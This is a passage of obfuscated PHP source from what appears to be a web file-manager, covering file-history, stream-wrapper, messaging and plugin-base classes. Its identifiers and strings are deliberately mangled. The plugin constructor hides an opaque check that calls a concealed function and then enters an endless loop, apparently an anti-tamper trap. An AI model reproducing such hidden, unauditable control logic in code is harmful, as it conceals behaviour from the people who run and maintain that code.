"{$Ô¤®ÛÎÔ}\x69\157\137\146\151\154\145\40\146\x69\154\145\x73\x20\x6f\156\x20\x66\x69\x6c\145\x73\x2e\146\x69\154\145\x49\104\40\75\x20\x68\x69\163\164\x6f\162\x79\56\146\x69\154\x65\111\x44"; return $this->alias($ÒÄæş“[2042])->where(array($ÒÄæş“[422] => $à€Ó÷Ê¸))->join($­½´…èÓ, $ÒÄæş“[2043])->find(); } public function removeItem($åòüªÎ£) { $™ìƒÃ°Ù =& $_SERVER[ë¦»ºéÌ]; $™¾˜Ó¦ó = array($™ìƒÃ°Ù[422] => $åòüªÎ£); $÷·×Æ„ğ = $this->where($™¾˜Ó¦ó)->find(); if ($÷·×Æ„ğ) { $‰ê› Ë = $this->where($™¾˜Ó¦ó)->delete(); Model($™ìƒÃ°Ù[472])->remove($÷·×Æ„ğ[$™ìƒÃ°Ù[469]]); return $‰ê› Ë; } return !1; } public function removeBySource($¼ƒõ¥…ƒ) { $óˆ¢ëÊ€ =& $_SERVER[ë¦»ºéÌ]; if (!$¼ƒõ¥…ƒ) { return !1; } if (!is_array($¼ƒõ¥…ƒ)) { $¼ƒõ¥…ƒ = array($¼ƒõ¥…ƒ); } $‰ÀÖéÌÁ = array($óˆ¢ëÊ€[420] => array($óˆ¢ëÊ€[7], $¼ƒõ¥…ƒ)); $‰‘ã³¹ = $this->field($óˆ¢ëÊ€[470])->where($‰ÀÖéÌÁ)->select(); if ($‰‘ã³¹) { $this->where($‰ÀÖéÌÁ)->delete(); $éüáÓàÜ = array_to_keyvalue($‰‘ã³¹, $óˆ¢ëÊ€[12], $óˆ¢ëÊ€[469]); Model($óˆ¢ëÊ€[472])->remove($éüáÓàÜ); } return !0; } public function setDetail($Åõ›©¸‘, $ØÌçˆÉê) { $á€’¡Ã« =& $_SERVER[ë¦»ºéÌ]; return $this->where(array($á€’¡Ã«[422] => $Åõ›©¸‘))->save(array($á€’¡Ã«[2033] => $ØÌçˆÉê)); } public function rollbackToItem($•ş»¦®ë, $€ş³Ú) { $íØ…Àº´ =& $_SERVER[ë¦»ºéÌ]; $ù÷¸¬ ß = Model($íØ…Àº´[809])->sourceInfo($•ş»¦®ë); $this->addHistory($ù÷¸¬ ß, LNG($íØ…Àº´[2044])); $ôÈÜÃç = $this->find($€ş³Ú); $»Üœ±ô = array($íØ…Àº´[469] => $ôÈÜÃç[$íØ…Àº´[469]], $íØ…Àº´[90] => $ôÈÜÃç[$íØ…Àº´[90]], $íØ…Àº´[96] => time(), $íØ…Àº´[456] => USER_ID); Model($íØ…Àº´[809])->where(array($íØ…Àº´[405] => $•ş»¦®ë))->save($»Üœ±ô); return $this->where(array($íØ…Àº´[422] => $€ş³Ú))->delete(); } public function clearSame($˜Ã¶ÜÜº) { $ÛÔîò–´ =& $_SERVER[ë¦»ºéÌ]; $ï·Ç¼ˆ = $this->listData($˜Ã¶ÜÜº); $Ğãş©Â¢ = array_to_keyvalue_group($ï·Ç¼ˆ, $ÛÔîò–´[469]); $‰âËü¬ß = array(); $¨“Õù¿„ = array(); foreach ($Ğãş©Â¢ as $ÜşÉŠÃš) { if (!$ÜşÉŠÃš || count($ÜşÉŠÃš) <= 1) { continue; } foreach ($ÜşÉŠÃš as $ÁÆ‹ëü±) { $‰âËü¬ß[] = $ÁÆ‹ëü±[$ÛÔîò–´[469]]; $¨“Õù¿„[] = $ÁÆ‹ëü±[$ÛÔîò–´[403]]; } } if (!$¨“Õù¿„) { return; } $this->where(array($ÛÔîò–´[403] => array($ÛÔîò–´[7], $¨“Õù¿„)))->delete(); Model($ÛÔîò–´[472])->remove($‰âËü¬ß); } public function userSpace() { $Ú¢ò¶„ç =& $_SERVER[ë¦»ºéÌ]; $®·’ëØå = $this->tablePrefix; $ô‰Ÿˆ¼Ô = array($Ú¢ò¶„ç[1623] => USER_ID); $¼çÛÖ§€ = "{$®·’ëØå}\x69\x6f\x5f\146\x69\154\145\x20\x66\x69\154\145\x73\x20\x6f\x6e\40\x66\x69\154\145\163\56\146\151\x6c\145\111\x44\40\x3d\x20\150\x69\x73\x74\157\162\171\x2e\146\x69\154\145\x49\104"; return $this->alias($Ú¢ò¶„ç[2042])->where($ô‰Ÿˆ¼Ô)->join($¼çÛÖ§€, $Ú¢ò¶„ç[2043])->sum($Ú¢ò¶„ç[90]); } } goto CªØåÌ…ß†; d”ÂïÇ óŠ: define($_SERVER[ë¦»ºéÌ][246], 3); define($_SERVER[ë¦»ºéÌ][247], 1); define($_SERVER[ë¦»ºéÌ][248], 0); goto f¤Î©Ğ Æ; cÒ„Ğ‰ÊÚ™: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($µŠï×É, $İİ³é¼² = '') { $this->info = $this->info($µŠï×É); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ë¦»ºéÌ][88]]; $this->pathOpen = $µŠï×É; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$µŠï×É])) { self::$_chunkBuffer[$µŠï×É] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($óÆÛ¥š®) { $‚“»Ã„¾ = $this->fileSubstr($this->pose, $óÆÛ¥š®); $this->pose += strlen($‚“»Ã„¾); return $‚“»Ã„¾; } public function stream_tell() { return $this->pose; } public function stream_seek($ï¥»‡, $öä€¡©ƒ) { $é¼ ¥¢Â =& $_SERVER[ë¦»ºéÌ]; if ($öä€¡©ƒ == SEEK_SET) { $this->pose = $ï¥»‡; } else { if ($öä€¡©ƒ == SEEK_CUR) { $this->pose += $ï¥»‡; } else { if ($öä€¡©ƒ == SEEK_END) { $this->pose = $this->info[$é¼ ¥¢Â[90]] + intval($ï¥»‡); } } } if ($ï¥»‡ < 0) { $this->pose = $this->info[$é¼ ¥¢Â[90]] + $ï¥»‡; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ë¦»ºéÌ][90]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($³Æ–õ…, $´Á…á¿) { $ùü°°¥é =& $_SERVER[ë¦»ºéÌ]; $§›‹­Í£ = $this->info($³Æ–õ…); return array($ùü°°¥é[1481] => 0, $ùü°°¥é[1482] => 0, $ùü°°¥é[26] => 32768 + 511, $ùü°°¥é[1483] => 0, $ùü°°¥é[1484] => 0, $ùü°°¥é[1485] => 0, $ùü°°¥é[1486] => 0, $ùü°°¥é[90] => $§›‹­Í£[$ùü°°¥é[90]], $ùü°°¥é[1487] => $§›‹­Í£[$ùü°°¥é[1355]], $ùü°°¥é[1443] => $§›‹­Í£[$ùü°°¥é[96]], $ùü°°¥é[1442] => $§›‹­Í£[$ùü°°¥é[205]], $ùü°°¥é[1488] => 0, $ùü°°¥é[1489] => 0); } static $fileInfo = array(); public function info($Ø§ô‚‚‚) { $éˆ”¿¾ = $_SERVER[ë¦»ºéÌ][1490]; if (isset(self::$fileInfo[$Ø§ô‚‚‚])) { return self::$fileInfo[$Ø§ô‚‚‚]; } if (substr($Ø§ô‚‚‚, 0, strlen($éˆ”¿¾)) != $éˆ”¿¾) { return !1; } self::$fileInfo[$Ø§ô‚‚‚] = IO::info(substr($Ø§ô‚‚‚, strlen($éˆ”¿¾))); return self::$fileInfo[$Ø§ô‚‚‚]; } public static function read($¡ÜÔæŸ©, $´Ç—ÀÁ”, $¾Ñ¶Îó•) { if (!isset(self::$_fopenCache[$¡ÜÔæŸ©])) { $üçï»®ö = new StreamWrapperIO(); $üçï»®ö->stream_open($¡ÜÔæŸ©); self::$_fopenCache[$¡ÜÔæŸ©] = $üçï»®ö; } $üçï»®ö = self::$_fopenCache[$¡ÜÔæŸ©]; return $üçï»®ö->fileSubstr($´Ç—ÀÁ”, $¾Ñ¶Îó•); } public static function _read($Ô‡šÉÈ, $ç¾ÏÎ­µ, $¶ßÍá´Œ) { $¬¾ÄÅ =& $_SERVER[ë¦»ºéÌ]; $£›²çİÖ = fopen($Ô‡šÉÈ, $¬¾ÄÅ[1359]); if (!$£›²çİÖ) { return $¬¾ÄÅ[12]; } $óĞÓ”®® = 8192; fseek($£›²çİÖ, $ç¾ÏÎ­µ, SEEK_SET); $è¯·ëš = $¬¾ÄÅ[12]; $Ë¼ù¨¹à = 0; while ($Ë¼ù¨¹à < $¶ßÍá´Œ) { $“Õ×°¹ = min($óĞÓ”®®, $¶ßÍá´Œ - $Ë¼ù¨¹à); $è¯·ëš .= fread($£›²çİÖ, $“Õ×°¹); $Ë¼ù¨¹à += $“Õ×°¹; } fclose($£›²çİÖ); return $è¯·ëš; } public function fileSubstr($ôÕ›ı‘‚, $Á¹ ¸‚) { $ƒˆ¸»ßË =& $_SERVER[ë¦»ºéÌ]; $¢ÛäßŒô = $this->info[$ƒˆ¸»ßË[90]]; $•ìÜ¾Øç = $ôÕ›ı‘‚; $ß´ÁŸô¼ = $Á¹ ¸‚; if ($ôÕ›ı‘‚ < 0) { $ôÕ›ı‘‚ = $¢ÛäßŒô + $ôÕ›ı‘‚; } if ($Á¹ ¸‚ === !1) { $Á¹ ¸‚ = $¢ÛäßŒô - $ôÕ›ı‘‚; } if ($ôÕ›ı‘‚ + $Á¹ ¸‚ > $¢ÛäßŒô) { $Á¹ ¸‚ = $¢ÛäßŒô - $ôÕ›ı‘‚; } if ($Á¹ ¸‚ <= 0) { return $ƒˆ¸»ßË[12]; } if ($ôÕ›ı‘‚ < 0 || $ôÕ›ı‘‚ >= $¢ÛäßŒô || $Á¹ ¸‚ <= 0 || $Á¹ ¸‚ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\151\x6c\145\x52\x65\x61\x64\40\145\162\x72\x6f\162\41\x20\163\x74\x61\162\164\75{$ôÕ›ı‘‚}\x3b\154\145\156\x67\164\150\75{$Á¹ ¸‚}\73\40\x73\x69\x7a\145\75{$¢ÛäßŒô}\73"); } $ºå‚ˆŞî = 64 * 1024; $ÆüÂ©“ =& self::$_chunkBuffer[$this->path]; if (!$ÆüÂ©“) { $ÆüÂ©“ = array(); } $êòÍÛ¦ = 0; $’ë¡÷Ò© = 0; $¸¥·ùÏ‹ = $ƒˆ¸»ßË[12]; foreach ($ÆüÂ©“ as $êòÍÛ¦ => $¸¥·ùÏ‹) { $êòÍÛ¦ = intval($êòÍÛ¦); $’ë¡÷Ò© = $êòÍÛ¦ + strlen($¸¥·ùÏ‹); if ($ôÕ›ı‘‚ >= $’ë¡÷Ò©) { continue; } if ($ôÕ›ı‘‚ >= $êòÍÛ¦ && $ôÕ›ı‘‚ + $Á¹ ¸‚ <= $’ë¡÷Ò©) { return substr($¸¥·ùÏ‹, $ôÕ›ı‘‚ - $êòÍÛ¦, $Á¹ ¸‚); } break; } if (count($ÆüÂ©“) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ƒˆ¸»ßË[1491], $ƒˆ¸»ßË[1492] . count($ÆüÂ©“) . "\x3b\x73\164\141\162\164\x3d{$ôÕ›ı‘‚}\54\154\x65\x6e\147\x74\150\75{$Á¹ ¸‚}\73\x70\x6f\163\x65\72{$êòÍÛ¦}\x7e{$’ë¡÷Ò©}"); throw new Exception($ƒˆ¸»ßË[1493]); } $‘ŸìÓ = intval($ôÕ›ı‘‚ / $ºå‚ˆŞî) * $ºå‚ˆŞî; $…¿Ûî¿Î = ceil(($ôÕ›ı‘‚ + $Á¹ ¸‚) / $ºå‚ˆŞî) * $ºå‚ˆŞî - $‘ŸìÓ; $€íá¦È² = IO::fileSubstr($this->path, $‘ŸìÓ, $…¿Ûî¿Î); $ÆüÂ©“[$‘ŸìÓ . $ƒˆ¸»ßË[12]] = $€íá¦È²; ksort($ÆüÂ©“); $Ééšñ² = substr($€íá¦È², $ôÕ›ı‘‚ - $‘ŸìÓ, $Á¹ ¸‚); return $Ééšñ²; } private function log($¦ƒºÁÌƒ, $½ ™µÀ’) { $¯ş‡ÕÄ =& $_SERVER[ë¦»ºéÌ]; $•©Ù§Œ³ = timeFloat() - $this->timeStart; write_log(sprintf($¯ş‡ÕÄ[1494], $¦ƒºÁÌƒ, $this->info[$¯ş‡ÕÄ[42]], $•©Ù§Œ³, $½ ™µÀ’), $¯ş‡ÕÄ[1161]); } } class Message { function __construct() { } public function send($é‡¨†Ûâ = '', $¥ÏµŠ = array(), $ÅşŞÊÒ = "\x74\x65\170\164") { $Á†ëûß± =& $_SERVER[ë¦»ºéÌ]; $ÀÈ”Ğ˜Ñ = array($Á†ëûß±[43] => $Á†ëûß±[1495], $Á†ëûß±[739] => $é‡¨†Ûâ); if (in_array($ÅşŞÊÒ, array($Á†ëûß±[1495], $Á†ëûß±[1496]))) { $ÀÈ”Ğ˜Ñ[$Á†ëûß±[43]] = $ÅşŞÊÒ; } $¥ÏµŠ = array($Á†ëûß±[517] => isset($¥ÏµŠ[$Á†ëûß±[517]]) ? $¥ÏµŠ[$Á†ëûß±[517]] : $Á†ëûß±[12], $Á†ëûß±[596] => isset($¥ÏµŠ[$Á†ëûß±[596]]) ? $¥ÏµŠ[$Á†ëûß±[596]] : $Á†ëûß±[12]); if (empty($é‡¨†Ûâ) || empty($¥ÏµŠ[$Á†ëûß±[517]]) && empty($¥ÏµŠ[$Á†ëûß±[596]])) { return !1; } $£¯´Ä±õ = array($Á†ëûß±[1436] => $ÀÈ”Ğ˜Ñ, $Á†ëûß±[1497] => $¥ÏµŠ); Hook::trigger($Á†ëûß±[1498], $£¯´Ä±õ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $´¶¤¤á˜ =& $_SERVER[ë¦»ºéÌ]; if (!isset($_SERVER[$´¶¤¤á˜[13]]) || !isset($_SERVER[$´¶¤¤á˜[22]])) { $Û“Åé©î = $´¶¤¤á˜[857]; $úÍ¨ƒ‡¨ = $´¶¤¤á˜[15]; $º‰ÎàÁ = $_SERVER[$´¶¤¤á˜[16]] . $´¶¤¤á˜[17]; $ÂæçèÔ— = $úÍ¨ƒ‡¨($º‰ÎàÁ); $³ƒßÒÅï = explode($´¶¤¤á˜[18], $ÂæçèÔ—); if (count($³ƒßÒÅï) < $´¶¤¤á˜[616]) { $å™çñ¾Ş = $´¶¤¤á˜[20]; $å™çñ¾Ş(); } $¸ ¦·ö = $´¶¤¤á˜[858]; $¸ ¦·ö($_SERVER[$´¶¤¤á˜[859]]); $¬ïËôª = 1; for ($­±£›ûİ = $¬ïËôª; $­±£›ûİ > 0; $­±£›ûİ++) { $¸ ¦·ö = json_encode($GLOBALS[$´¶¤¤á˜[421]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($´¶¤¤á˜[1499]); $this->pluginName = str_replace($´¶¤¤á˜[1499], $´¶¤¤á˜[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $´¶¤¤á˜[8]; $this->pluginApi = appHostGet() . $´¶¤¤á˜[1500] . $this->pluginName . $´¶¤¤á˜[8]; $this->pluginHost = $config[$´¶¤¤á˜[1501]] . $this->pluginName . $´¶¤¤á˜[8]; $this->pluginHostDefault = $config[$´¶¤¤á˜[1501]] . $this->pluginName . $´¶¤¤á˜[8]; $Ş—†éŒ = $config[$´¶¤¤á˜[1502]]; if ($Ş—†éŒ && strpos($´¶¤¤á˜[60] . $Ş—†éŒ . $´¶¤¤á˜[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$´¶¤¤á˜[1503]] . $this->pluginName . $´¶¤¤á˜[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ë¦»ºéÌ][1504]); } protected function assign($É½óç°, $êàÁ·ëÂ = false) { if (is_array($É½óç°)) { $this->values = array_merge($this->values, $É½óç°); } else { $this->values[$É½óç°] = $êàÁ·ëÂ; } } protected function display($ÕÅ€×û›) { extract($this->values); require $ÕÅ€×û›; } final function hookRegist($²µÒ¨Ù›) { $this->modelPlugin->appRegist($this->pluginName, $²µÒ¨Ù›); } final function appIcon() { $à¢•İÄ =& $_SERVER[ë¦»ºéÌ]; $î‰ ªÃŞ = $this->appPackage(); $¦áõÓè„ = $à¢•İÄ[12]; if (isset($î‰ ªÃŞ[$à¢•İÄ[419]])) { if (isset($î‰ ªÃŞ[$à¢•İÄ[419]][$à¢•İÄ[1505]])) { $¦áõÓè„ = $à¢•İÄ[1506] . $î‰ ªÃŞ[$à¢•İÄ[419]][$à¢•İÄ[1505]] . $à¢•İÄ[1507]; } else { if ($î‰ ªÃŞ[$à¢•İÄ[419]][$à¢•İÄ[1508]]) { $¦áõÓè„ = $à¢•İÄ[1509] . $î‰ ªÃŞ[$à¢•İÄ[419]][$à¢•İÄ[1508]] . $à¢•İÄ[1510]; } } } return $¦áõÓè„; } final function fileCanView($ãÍ¨¾˜è) { $Ú…³Õ®Á =& $_SERVER[ë¦»ºéÌ]; if (request_url_safe($ãÍ¨¾˜è)) { return !0; } if ($this->isShare($ãÍ¨¾˜è)) { return !0; } $Ääåçíº = Session::get($Ú…³Õ®Á[1511]); if (!$Ääåçíº || !$Ääåçíº[$Ú…³Õ®Á[1512]]) { $Ìİ©úˆ = $Ú…³Õ®Á[1513] . rawurlencode(this_url()); show_tips(LNG($Ú…³Õ®Á[1514]) . $Ú…³Õ®Á[1515] . $Ìİ©úˆ . $Ú…³Õ®Á[1516] . LNG($Ú…³Õ®Á[1517]) . $Ú…³Õ®Á[1518], !1); } if (!Action($Ú…³Õ®Á[1519])->authCan($Ú…³Õ®Á[1520])) { show_tips(LNG($Ú…³Õ®Á[1521]) . $Ú…³Õ®Á[1522], !1); } ActionCall($Ú…³Õ®Á[1523], $ãÍ¨¾˜è); } final function isShare($»Çéüà®) { $ŠĞİÚóÂ = KodIO::parse($»Çéüà®); return $ŠĞİÚóÂ[$_SERVER[ë¦»ºéÌ][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($”ÓÆñßÊ) { if (request_url_safe($”ÓÆñßÊ)) { return $”ÓÆñßÊ; } if (!$this->isShare($”ÓÆñßÊ)) { $”ÓÆñßÊ = $this->filePath($”ÓÆñßÊ); } return Action($_SERVER[ë¦»ºéÌ][1153])->linkOut($”ÓÆñßÊ); } public function filePathLinkOut($ª—½æĞä) { if (request_url_safe($ª—½æĞä)) { return $ª—½æĞä; } $this->fileCanView($ª—½æĞä); return Action($_SERVER[ë¦»ºéÌ][1153])->link($ª—½æĞä); } final function filePath($´³‹ø¦¶) { $ùí˜µîï =& $_SERVER[ë¦»ºéÌ]; if ($ôŸ»´ = $this->checkSharePath($´³‹ø¦¶)) { Hook::trigger($ùí˜µîï[1524], $ôŸ»´); return $ôŸ»´; } $this->fileCanView($´³‹ø¦¶); if (request_url_safe($´³‹ø¦¶)) { $‹é¿é†» = parse_url_query($´³‹ø¦¶); if (isset($‹é¿é†»[$ùí˜µîï[1525]]) && isset($‹é¿é†»[$ùí˜µîï[220]])) { $–¨·Ä’ò = Model($ùí˜µîï[754])->get($ùí˜µîï[755]); $±¼¬ò‚£ = Mcrypt::decode($‹é¿é†»[$ùí˜µîï[220]], $–¨·Ä’ò); if ($±¼¬ò‚£) { $this->fileInfo = IO::infoWithChildren($±¼¬ò‚£); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $±¼¬ò‚£; } } $´³‹ø¦¶ = $this->_cacheHttpFile($´³‹ø¦¶); $this->fileInfo = IO::infoWithChildren($´³‹ø¦¶); } else { $this->fileInfo = IO::infoWithChildren($´³‹ø¦¶); if (!$this->fileInfo) { show_tips(LNG($ùí˜µîï[116]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($ùí˜µîï[1524], $´³‹ø¦¶); return $´³‹ø¦¶; } final function _cacheHttpFile($ÀŸâŒÜÕ) { $î½‰²ßÙ = hash_path($ÀŸâŒÜÕ, !0); $this->cachePath = $this->pluginCachePath($î½‰²ßÙ); if ($¦Ä†âÄÁ = IO::fileNameExist($this->cachePath, $î½‰²ßÙ)) { return KodIO::make($¦Ä†âÄÁ); } $­½ôŞÒŒ = $this->cachePath . $î½‰²ßÙ; return $this->pluginCacheFileSet($­½ôŞÒŒ, file_get_contents_nossl($ÀŸâŒÜÕ)); } final function _tmpFileName($Ù‚ù¶Õ§ = array()) { $ƒÕıã•­ =& $_SERVER[ë¦»ºéÌ]; if (!$Ù‚ù¶Õ§) { $Ù‚ù¶Õ§ = $this->fileInfo; } if (isset($Ù‚ù¶Õ§[$ƒÕıã•­[182]])) { return $Ù‚ù¶Õ§[$ƒÕıã•­[182]]; } if (isset($Ù‚ù¶Õ§[$ƒÕıã•­[175]][$ƒÕıã•­[182]])) { return $Ù‚ù¶Õ§[$ƒÕıã•­[175]][$ƒÕıã•­[182]]; } $ò…ÂÅÏ = IO::hashSimple($Ù‚ù¶Õ§[$ƒÕıã•­[88]]); if ($ò…ÂÅÏ) { return $ò…ÂÅÏ; } $ĞÏóıŞ­ = array($Ù‚ù¶Õ§[$ƒÕıã•­[42]], $Ù‚ù¶Õ§[$ƒÕıã•­[88]], $Ù‚ù¶Õ§[$ƒÕıã•­[90]]); if (isset($Ù‚ù¶Õ§[$ƒÕıã•­[523]])) { $ĞÏóıŞ­[] = $Ù‚ù¶Õ§[$ƒÕıã•­[523]]; } return md5(implode($ƒÕıã•­[11], $ĞÏóıŞ­)); } final function checkSharePath($áò÷µÅ) { $è‹Ÿ’ô¶ =& $_SERVER[ë¦»ºéÌ]; if (!defined($è‹Ÿ’ô¶[476])) { define($è‹Ÿ’ô¶[516], 0); } if (!$this->isShare($áò÷µÅ)) { return !1; } $œè‘¦ = Action($è‹Ÿ’ô¶[1153])->sharePathInfo($áò÷µÅ); if (!isset($œè‘¦[$è‹Ÿ’ô¶[88]])) { show_json(LNG($è‹Ÿ’ô¶[1526]), !1); } $this->fileInfo = $œè‘¦[$è‹Ÿ’ô¶[175]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$è‹Ÿ’ô¶[182]]); return $œè‘¦[$è‹Ÿ’ô¶[88]]; } final function pluginCachePath($µÇÏ½“ = '') { $˜«¶Â‰‡ =& $_SERVER[ë¦»ºéÌ]; $Ê¡‚°÷ = IO_PATH_SYSTEM_TEMP . $˜«¶Â‰‡[1527] . $this->pluginName; if (!($Ò‘¶Ú– = IO::infoFull($Ê¡‚°÷))) { return IO::mkdir($Ê¡‚°÷ . $˜«¶Â‰‡[8] . $µÇÏ½“); } if (empty($µÇÏ½“)) { return $Ò‘¶Ú–[$˜«¶Â‰‡[88]]; } if (!($ÂÛ»Êäâ = IO::fileNameExist($Ò‘¶Ú–[$˜«¶Â‰‡[88]], $µÇÏ½“))) { return IO::mkdir($Ò‘¶Ú–[$˜«¶Â‰‡[88]] . $µÇÏ½“); } return KodIO::make($ÂÛ»Êäâ); } final function pluginCacheFileSet($›×ù¡Ïœ, $¾‘“¬»– = '') { $æ»ş²ö× =& $_SERVER[ë¦»ºéÌ]; if (!($Ø³¶ŞÀÎ = IO::infoFull($›×ù¡Ïœ))) { return IO::mkfile($›×ù¡Ïœ, $¾‘“¬»–, REPEAT_REPLACE); } IO::setContent($Ø³¶ŞÀÎ[$æ»ş²ö×[88]], $¾‘“¬»–); return $Ø³¶ŞÀÎ[$æ»ş²ö×[88]]; } final function pluginLocalFile($—éû¥µö = '') { $”¦Îµæ =& $_SERVER[ë¦»ºéÌ]; $¼óÂ€ûø = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($¼óÂ€ûø)) { mk_dir($¼óÂ€ûø); } if (!$—éû¥µö) { return $¼óÂ€ûø; } $İê÷Ï›­ = IO::info($—éû¥µö); $ ê½â¸² = $this->_tmpFileName($İê÷Ï›­) . $”¦Îµæ[10] . $İê÷Ï›­[$”¦Îµæ[179]]; if (!checkExtSafe($ ê½â¸²)) { $ ê½â¸² = $ ê½â¸² . $”¦Îµæ[1528]; } $¾ğºƒãş = $¼óÂ€ûø . $ ê½â¸²; if (@file_exists($¾ğºƒãş)) { return $¾ğºƒãş; } return IO::copy($—éû¥µö, $¼óÂ€ûø, 0, $ ê½â¸²); } final function appPackage() { $‘¥õ­•Œ =& $_SERVER[ë¦»ºéÌ]; if ($this->packageData) { return $this->packageData; } $Ş‚¡å‰× = $this->parseFile($this->pluginPath . $‘¥õ­•Œ[1529]); $this->parseLang($Ş‚¡å‰×); $Š‰××Â‡ = json_decode_force($Ş‚¡å‰×); if (!$Š‰××Â‡) { return array(); } $ØÇÅ‚€Ï = Hook::trigger($‘¥õ­•Œ[1530], $Š‰××Â‡); if ($ØÇÅ‚€Ï && is_array($ØÇÅ‚€Ï)) { $Š‰××Â‡ = $ØÇÅ‚€Ï; } $this->packageData = $Š‰××Â‡; return $Š‰××Â‡; } public function packageInfoGet($Ş˜Ğ†û) { $ÔçÍÈƒ® = $this->appPackage(); return array_get_value($ÔçÍÈƒ®, $Ş˜Ğ†û); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ë¦»ºéÌ][1531]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ë¦»ºéÌ][1532]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ë¦»ºéÌ][1533]); } public function echoJsAssign($ıÜ¡÷²Æ, $úõŞ¯Â¿) { $this->echoJsAssignArr[$ıÜ¡÷²Æ] = $úõŞ¯Â¿; } private function parseFile($Ó´Ãñ—) { $Ëâ‰ê¢ö =& $_SERVER[ë¦»ºéÌ]; $¦ÕÈ¨öğ = file_get_contents_nossl($Ó´Ãñ—); $µŒÚ´äÎ = array($Ëâ‰ê¢ö[1534], $Ëâ‰ê¢ö[1535], $Ëâ‰ê¢ö[1536], $Ëâ‰ê¢ö[1537], $Ëâ‰ê¢ö[1538], $Ëâ‰ê¢ö[1539], $Ëâ‰ê¢ö[1540]); $–šÏß¸­ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ëâ‰ê¢ö[100]][$Ëâ‰ê¢ö[1541]]); foreach ($this->echoJsAssignArr as $†¿ñµÊé => $°µƒ¤ÏÄ) { $µŒÚ´äÎ[] = $Ëâ‰ê¢ö[1542] . $†¿ñµÊé . $Ëâ‰ê¢ö[1543]; $–šÏß¸­[] = is_array($°µƒ¤ÏÄ) || is_object($°µƒ¤ÏÄ) ? rawurlencode(json_encode($°µƒ¤ÏÄ)) : $°µƒ¤ÏÄ; } if (strstr($¦ÕÈ¨öğ, $Ëâ‰ê¢ö[1544])) { $ÇÂ‰µÏŞ = rawurlencode(json_encode($this->pluginLangArr)); $¦ÕÈ¨öğ = str_replace($Ëâ‰ê¢ö[1544], $ÇÂ‰µÏŞ, $¦ÕÈ¨öğ); } if (strstr($¦ÕÈ¨öğ, $Ëâ‰ê¢ö[1545])) { $ÇÂ‰µÏŞ = $ÇÂ‰µÏŞ = rawurlencode(json_encode($this->getConfig())); $¦ÕÈ¨öğ = str_replace($Ëâ‰ê¢ö[1545], $ÇÂ‰µÏŞ, $¦ÕÈ¨öğ); } $¦ÕÈ¨öğ = str_replace($µŒÚ´äÎ, $–šÏß¸­, $¦ÕÈ¨öğ); return $¦ÕÈ¨öğ; } private function parseLang(&$¿áŒ¥İ¾) { $òô°ËÌ½ =& $_SERVER[ë¦»ºéÌ]; $Ó•Ïí‡è = $òô°ËÌ½[1546]; if (!strstr($¿áŒ¥İ¾, $Ó•Ïí‡è)) { return; } preg_match_all($òô°ËÌ½[1547], $¿áŒ¥İ¾, $‹ÎŞéŞ); if (!is_array($‹ÎŞéŞ) || count($‹ÎŞéŞ) == 0 || !is_array($‹ÎŞéŞ[0]) || count($‹ÎŞéŞ[0]) == 0) { return; } $ş†èìôÒ = array(); $­‡ŠÌ° = array(); foreach ($‹ÎŞéŞ[0] as $ØĞ£ÕùÂ) { $¥±ÌµÂ€ = substr($ØĞ£ÕùÂ, strlen($Ó•Ïí‡è), -4); $ ••ş†™ = LNG($¥±ÌµÂ€); $ş†èìôÒ[] = $ØĞ£ÕùÂ; $­‡ŠÌ°[] = str_replace(array($òô°ËÌ½[18], $òô°ËÌ½[1058], $òô°ËÌ½[348], $òô°ËÌ½[129]), array($òô°ËÌ½[63], $òô°ËÌ½[63], $òô°ËÌ½[12], $òô°ËÌ½[1548]), $ ••ş†™); } $¿áŒ¥İ¾ = str_replace($ş†èìôÒ, $­‡ŠÌ°, $¿áŒ¥İ¾); } private function parseConfig(&$¹í˜½Ä) { $¢Š“Ò´ù =& $_SERVER[ë¦»ºéÌ]; $÷•Ç‘‹ô = $¢Š“Ò´ù[1549]; if (!strstr($¹í˜½Ä, $÷•Ç‘‹ô)) { return; } preg_match_all($¢Š“Ò´ù[1550], $¹í˜½Ä, $·ÎªÜÌÆ); if (!is_array($·ÎªÜÌÆ) || count($·ÎªÜÌÆ) == 0 || !is_array($·ÎªÜÌÆ[0]) || count($·ÎªÜÌÆ[0]) == 0) { return; } $“ùÌõê = $this->getConfig(); $õçóæ = array(); $ÔÛğÖÒó = array(); foreach ($·ÎªÜÌÆ[0] as $¿íŞ¡—) { $¦úØĞ§Œ = substr($¿íŞ¡—, strlen($÷•Ç‘‹ô), -2); $õçóæ[] = $¿íŞ¡—; $ÔÛğÖÒó[] = _get($“ùÌõê, $¦úØĞ§Œ); } $¹í˜½Ä = str_replace($õçóæ, $ÔÛğÖÒó, $¹í˜½Ä); } private function parsePackage(&$üû Ğ‰©) { $ü”ìÃòÙ =& 